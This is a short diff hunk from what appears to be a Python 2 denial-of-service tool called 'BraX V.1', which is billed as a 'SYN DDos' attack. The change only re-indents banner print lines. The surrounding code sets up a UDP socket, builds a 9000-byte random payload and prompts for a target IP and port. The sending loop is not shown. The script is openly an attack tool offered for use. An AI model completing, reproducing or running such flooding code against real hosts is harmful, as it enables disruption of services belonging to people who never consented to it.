@@ -11,16 +11,16 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(9000)
 #############
 
-	os.system("clear")
-	os.system("figlet DDos Attack")
-	print "#############################"
-	print "#         BraX V.1          #"
-	print "#############################"
-	print "#    Welcome to SYN DDos    #"
-	print "#############################"
-	print "Author   : BraX"
-  print "Facebook : https://m.facebook.com/J.cknew"
-  print "Verion Demo"
+os.system("clear")
+os.system("figlet DDos Attack")
+print "#############################"
+print "#         BraX V.1          #"
+print "#############################"
+print "#    Welcome to SYN DDos    #"
+print "#############################"
+print "Author   : BraX"
+print "Facebook : https://m.facebook.com/J.cknew"
+print "Verion Demo"
 
 ip = raw_input("IP : ")
 port = input("Port : ") 
